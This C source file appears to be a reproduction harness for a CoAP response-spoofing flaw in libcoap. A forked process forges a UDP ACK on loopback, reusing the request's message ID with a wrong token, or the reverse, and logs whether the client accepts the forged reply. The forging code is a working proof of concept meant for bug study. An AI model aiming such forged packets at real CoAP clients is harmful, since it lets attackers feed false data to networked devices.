/* Debug variant of token-spoof-repro.c with DEBUG logging; FLIP_MID=1 flips the reverse case. */
#define _DEFAULT_SOURCE
#include <arpa/inet.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <coap3/coap.h>

#define PORT 5685

static void forger(int flip_mid) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  struct sockaddr_in me = {.sin_family = AF_INET,
                           .sin_port = htons(PORT),
                           .sin_addr.s_addr = htonl(INADDR_LOOPBACK)};
  bind(fd, (struct sockaddr *)&me, sizeof(me));

  uint8_t in[256];
  struct sockaddr_in cli;
  socklen_t len = sizeof(cli);
  recvfrom(fd, in, sizeof(in), 0, (struct sockaddr *)&cli, &len);

  /* match case: reuse MID; flip_mid: flip MID (!= request MID). */
  uint8_t mid_hi = flip_mid ? (uint8_t)(in[2] ^ 0xFF) : in[2];
  uint8_t mid_lo = flip_mid ? (uint8_t)(in[3] ^ 0xFF) : in[3];

  /* match case: wrong token; flip_mid: correct token (still shouldn't rescue). */
  uint8_t tok0 = flip_mid ? 0xDE : 0x00, tok1 = flip_mid ? 0xAD : 0x00;
  uint8_t tok2 = flip_mid ? 0xBE : 0x00, tok3 = flip_mid ? 0xEF : 0x00;

  uint8_t ack[] = {
      0x64,             /* ver 1, ACK, TKL 4 */
      0x45,             /* 2.05 Content */
      mid_hi, mid_lo,
      tok0, tok1, tok2, tok3,
      0xFF, 's', 'p', 'o', 'o', 'f'
  };
  sendto(fd, ack, sizeof(ack), 0, (struct sockaddr *)&cli, len);
  close(fd);
}

static int matched = 0;

static coap_response_t on_response(coap_session_t *session, const coap_pdu_t *sent,
                                   const coap_pdu_t *rcvd, const coap_mid_t mid) {
  coap_bin_const_t tok = coap_pdu_get_token(rcvd);
  printf(">>> client got response: matched_request=%s  delivered_token=",
         sent ? "YES" : "no");
  for (size_t i = 0; i < tok.length; i++)
    printf("%02X", tok.s[i]);
  printf("  (request token was DEADBEEF)\n");
  if (sent)
    matched = 1;
  (void)session;
  (void)mid;
  return COAP_RESPONSE_OK;
}

int main(void) {
  int flip_mid = getenv("FLIP_MID") != NULL;
  printf("=== mode: %s ===\n",
         flip_mid ? "FLIP_MID (wrong MID, CORRECT token) -> expect NO match"
                  : "default (right MID, wrong token) -> expect MATCH");

  if (fork() == 0) { forger(flip_mid); _exit(0); }
  usleep(200 * 1000);

  coap_startup();
  coap_set_log_level(COAP_LOG_DEBUG);

  coap_context_t *ctx = coap_new_context(NULL);
  coap_address_t dst;
  coap_address_init(&dst);
  dst.addr.sin.sin_family = AF_INET;
  dst.addr.sin.sin_port = htons(PORT);
  dst.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  coap_session_t *session =
      coap_new_client_session(ctx, NULL, &dst, COAP_PROTO_UDP);
  coap_register_response_handler(ctx, on_response);

  coap_pdu_t *pdu = coap_new_pdu(COAP_MESSAGE_CON, COAP_REQUEST_CODE_GET, session);
  coap_add_token(pdu, 4, (const uint8_t *)"\xDE\xAD\xBE\xEF");
  coap_add_option(pdu, COAP_OPTION_URI_PATH, 4, (const uint8_t *)"test");
  coap_send(session, pdu);

  for (int i = 0; i < 100 && !matched; i++)
    coap_io_process(ctx, 50 /* ms */);

  coap_session_release(session);
  coap_free_context(ctx);
  coap_cleanup();
  wait(NULL);

  printf("=== RESULT: %s ===\n",
         matched ? "MATCHED (sent != NULL)" : "NOT matched (sent == NULL)");
  return 0;
}
